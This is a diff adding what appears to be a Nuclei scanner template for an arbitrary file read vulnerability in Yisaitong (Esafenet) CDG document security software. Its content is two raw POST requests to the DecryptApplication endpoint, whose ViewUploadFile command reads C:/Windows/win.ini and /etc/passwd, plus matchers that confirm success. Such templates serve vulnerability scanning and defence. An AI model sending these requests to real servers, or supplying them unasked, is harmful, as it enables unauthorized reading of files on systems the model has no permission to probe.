@@ -1,0 +1,38 @@
+id: yisaitongCDG-ViewUploadFile-fileread
+
+info:
+  name: 亿赛通电子文档安全管理系统ViewUploadFile任意文件读取漏洞
+  author: yisaitongCDG
+  severity: medium
+  tags: fileread,yisaitong,CDG
+
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/client/DecryptApplication;Servicelogin HTTP/1.1
+        Host: {{Hostname}} 
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
+        Content-Type: application/x-www-form-urlencoded
+ 
+        command=ViewUploadFile&filePath=C:/Windows/win.ini&fileName1=1.png&uploadFileId=1
+        
+      - |
+        POST /CDGServer3/client/DecryptApplication;Servicelogin HTTP/1.1
+        Host: {{Hostname}} 
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/116.0
+        Content-Type: application/x-www-form-urlencoded
+ 
+        command=ViewUploadFile&filePath=/etc/passwd&fileName1=1.png&uploadFileId=1
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:'
+          - '; for 16-bit app support'
+      - type: status
+        status: 
+          - 200
+
